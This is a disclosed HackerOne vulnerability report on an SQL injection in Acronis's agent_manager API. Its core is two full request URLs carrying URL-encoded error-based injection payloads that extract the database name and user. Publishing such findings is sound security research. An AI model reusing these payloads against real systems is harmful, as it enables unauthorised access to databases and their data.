# SQL Injection in agent-manager

## Report Details
- **Report ID**: 962889
- **URL**: https://hackerone.com/reports/962889
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-08-20T02:36:05.140Z
- **Disclosed**: 2021-08-16T09:37:25.718Z

## Reporter
- **Username**: bourbon
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
1.https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2C%28select+database%28%29%29%29%29and%27
2.https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2C%28select+user%28%29%29%29%29and%27

## Impact

sql injection

## Attachments
- 1597890793.png
- 1597890845.jpg
